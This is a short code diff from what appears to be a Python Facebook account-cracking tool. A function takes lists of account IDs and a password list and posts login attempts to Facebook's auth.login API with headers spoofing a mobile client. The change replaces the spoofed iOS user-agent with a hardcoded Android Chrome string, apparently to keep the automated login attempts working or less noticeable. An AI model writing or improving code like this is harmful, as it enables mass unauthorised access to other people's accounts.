@@ -159,8 +159,7 @@ def api(ids,names,passlist,total_ids):
 				'x-fb-http-engine':'Liger',
 				'x-requested-with':'FBIOS',
 				'connection':'close',
-				'user-agent':ua_ios
-				}
+				'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
 			url = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 			q = json.loads(po)
